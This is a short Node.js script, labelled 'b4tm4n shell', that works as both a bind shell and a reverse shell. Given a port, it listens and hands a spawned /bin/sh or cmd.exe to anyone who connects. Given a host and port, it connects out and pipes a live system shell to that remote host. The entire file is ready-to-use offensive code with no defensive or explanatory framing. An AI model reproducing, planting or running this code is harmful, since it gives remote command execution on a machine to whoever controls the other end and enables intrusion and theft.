var spawn = require('child_process').spawn;
var net = require('net');
var stream = require('stream');
var console = require('console');

var shell = '/bin/sh';
if(process.platform.match(/^win/i)) shell = 'cmd.exe';

var argv = process.argv;
if(argv.length==3){
	var h = net.createServer(function(s){
		s.write("b4tm4n shell : connected\n");
        var sh = spawn(shell);
        sh.stdin.resume()
        sh.stdout.on("data",function (data){s.write(data);});
        sh.stderr.on("data",function (data){s.write(data);});
        s.on("data",function (data){sh.stdin.write(data);});
	});
	h.listen(argv[2]);
}
else if(argv.length==4){
	var s = net.createConnection(argv[2], argv[3]);
	s.write("b4tm4n shell : connected\n");
	var sh = spawn(shell);
	sh.stdin.resume()
	sh.stdout.on("data",function (data){s.write(data);});
	sh.stderr.on("data",function (data){s.write(data);});
	s.on("data",function (data){sh.stdin.write(data);});
}